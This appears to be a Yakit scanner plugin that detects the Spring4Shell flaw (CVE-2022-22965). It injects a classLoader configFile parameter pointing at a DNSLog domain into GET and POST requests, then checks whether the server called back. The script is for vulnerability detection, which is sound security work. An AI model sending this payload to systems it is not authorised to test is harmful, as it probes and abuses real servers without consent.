#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8089/?name=Bob&age=25")
    if err != nil {
        println(err)
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorNewWebsite(results...)
}

/*
type palm/common/mutate.(FuzzHTTPRequest) struct {
  Fields(可用字段):
      Opts: []mutate.BuildFuzzHTTPRequestOption
  StructMethods(结构方法/函数):
  PtrStructMethods(指针结构方法/函数):
      func Exec(v1 ...func httpPoolConfigOption(v1: *mutate.httpPoolConfig) ) return(chan *mutate._httpResult, error)
      func ExecFirst(v1 ...func httpPoolConfigOption(v1: *mutate.httpPoolConfig) ) return(*mutate._httpResult, error)
      func FuzzCookie(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzCookieRaw(v1: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzFormEncoded(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzGetParams(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzGetParamsRaw(v1 ...string) return(mutate.FuzzHTTPRequestIf)
      func FuzzHTTPHeader(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzMethod(v1 ...string) return(mutate.FuzzHTTPRequestIf)
      func FuzzPath(v1 ...string) return(mutate.FuzzHTTPRequestIf)
      func FuzzPostJsonParams(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzPostParams(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzPostRaw(v1 ...string) return(mutate.FuzzHTTPRequestIf)
      func FuzzUploadFile(v1: interface {}, v2: interface {}, v3: []uint8) return(mutate.FuzzHTTPRequestIf)
      func FuzzUploadFileName(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func FuzzUploadKVPair(v1: interface {}, v2: interface {}) return(mutate.FuzzHTTPRequestIf)
      func GetCommonParams() return([]*mutate.FuzzHTTPRequestParam)
      func GetCookieParams() return([]*mutate.FuzzHTTPRequestParam)
      func GetGetQueryParams() return([]*mutate.FuzzHTTPRequestParam)
      func GetOriginHTTPRequest() return(*http.Request, error)
      func GetPostJsonParams() return([]*mutate.FuzzHTTPRequestParam)
      func GetPostParams() return([]*mutate.FuzzHTTPRequestParam)
      func IsBodyFormEncoded() return(bool)
      func IsBodyJsonEncoded() return(bool)
      func IsBodyUrlEncoded() return(bool)
      func IsEmptyBody() return(bool)
      func ParamsHash() return(string, error)
      func Repeat(v1: int) return(mutate.FuzzHTTPRequestIf)
      func Results() return([]*http.Request, error)
      func Show()
}
*/


counter = 0
lock = sync.NewMutex()
add = fn() {
    lock.Lock()
    counter ++
    lock.Unlock()
}
sub = fn() {
    lock.Lock()
    counter --
    lock.Unlock()
}

# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    checking("GET", isHttps, url, req, rsp, body)
    checking("POST", isHttps, url, req, rsp, body)
}
checking = func(method, isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    host,port, _ = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    add()
    defer sub()

    printf("start to identify CVE-2022-22965: %v\n", url)
    freq, err = fuzz.HTTPRequest(req, fuzz.https(isHttps))   
    die(err)
    freq = freq.FuzzMethod(method)
    if method == "POST" {
        freq = freq.FuzzHTTPHeader("Content-Type", "application/x-www-form-urlencoded")
    }
    
    domain = ""
    token = ""
    dnsfetchCounter = 0
    for {
        domain, token, _ = risk.NewDNSLogDomain()
        if token == "" {
            dnsfetchCounter ++
            continue
        } else {
            if dnsfetchCounter > 10 {
                yakit_output("DNSLog Token Fetch ERROR")
                return
            }

            break
        }
    }

    yakit_output(sprintf("fetch dnslog token finished:[%v] target: %v", domain, addr))
    // class.module.classLoader.resources.context.configFile=http://*.dnslog.cn/test&class.module.classLoader.resources.context.configFile.content.aaa=xxx 
    if method == "POST" {
        freq = freq.FuzzPostParams("class.module.classLoader.resources.context.configFile.content.aaa", "xxx").FuzzPostParams(
            "class.module.classLoader.resources.context.configFile", sprintf("http://%v/%v", domain, str.RandStr(12)),
        )
    }else{
        freq = freq.FuzzGetParams("class.module.classLoader.resources.context.configFile.content.aaa", "xxx").FuzzGetParams(
            "class.module.classLoader.resources.context.configFile", sprintf("http://%v/%v", domain, str.RandStr(12)),
        )
    }
    response, _ := freq.ExecFirst()
    
    yakit_output(sprintf("DNSLog[%v] token: %v for %v", domain, token, addr))
    sleep(3)
    result, err = risk.CheckDNSLogByToken(token)
    if len(result) > 0 {
        yakit_output(sprintf("CVE-2022-22965：%v REVERSE DNSLOG: %v", addr, domain))
        risk.NewRisk(
            url, 
            risk.severity("critical"), 
            risk.title(sprintf("CVE-2022-22965[DNSlog]: spring-core rce jdk9+: %v", addr)),
            risk.type("rce"), risk.payload(sprintf("class.module.classLoader.resources.context.configFile=[dnslog-url]&class.module.classLoader.resources.context.configFile.content.aaa=xxx")),
            risk.details({
                "url": url, "reason": "configFile remote loaded for trigger dns query", "reason_verbose": "基于读取日志内容的加载远端 URL 来触发 DNSLog（DNS反连）",
                "method": method, "request": response.RequestRaw,
            }),
        )
    }
}